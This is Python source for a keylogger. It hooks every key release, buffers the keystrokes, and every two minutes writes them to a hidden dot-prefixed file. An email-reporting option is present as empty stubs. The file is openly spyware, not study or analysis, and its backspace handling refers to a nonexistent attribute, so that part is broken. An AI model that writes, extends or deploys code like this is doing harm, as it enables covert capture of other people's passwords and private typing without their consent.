import keyboard as kb
from datetime import date, datetime
from threading import Timer

# Time to save file
SAVE_FILE_EVERY = 120


class Keylogger:
    # all the required parameters for the keylogger
    def __init__(self, interval, report_method="file"):
        # Interval time
        self.interval = interval
        self.report_method = report_method
        # Variable to conatine log of all keystrokes during the interval
        self.log = ""
        # date time 
        self.start_dt = datetime.now()
        self.stop_dt = datetime.now()

    # function to get executed on every keyboard event
    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                # add a space when space entered
                name = " "
            elif name == "enter":
                # add a new line in place of enter 
                name = "[ENTER] \n"
            elif name == "decimal":
                #  add a . on decimal
                name = "."
            elif name == "backspace":
                self.log = self.logp[:-1]
            else:
                #  make it captial when any other event is triggered
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        # store it in the log variable
        self.log += name

    # update the file name if storing to file with the date time
    def update_filename(self):
        start_dt_str = str(self.start_dt) [:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.stop_dt) [:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}-{end_dt_str}"

    # save to log to the filename
    def report_to_file(self):
        # open a file with the following name
        with open(f".{self.filename}.txt", "w") as f:
            print(self.log , file=f)


    def prepare_email(self):
        # logic for creating a new email like body, subjet and all.
        pass

    def sent_email(self):
        # logic to send email
        pass

    # function to save the file
    def report(self):
        if self.log:
            # get the stop Date
            self.stop_dt = datetime.now()
            # update file name
            self.update_filename()
            # If request method is email then write email function
            if self.report_method == "email":
                # email function logic
                self.sent_email()
            # save to the file
            elif self.report_method == "file":
                self.report_to_file()
        # reset the log variable to empty
        self.log = ""
        # call report function after internal
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    # start logging function
    def start(self):
        # start time
        self.start_dt = datetime.now()
        # log function
        kb.on_release(callback=self.callback)
        # save funtion
        self.report()
        # keep running
        kb.wait()



# call the function with the methods on script execution.
if __name__ == '__main__':
    # keylogger = Keylogger(interval=SAVE_FILE_EVERY, report_methods="email") // For Email
    keylogger = Keylogger(interval=SAVE_FILE_EVERY, report_method="file")
    keylogger.start()
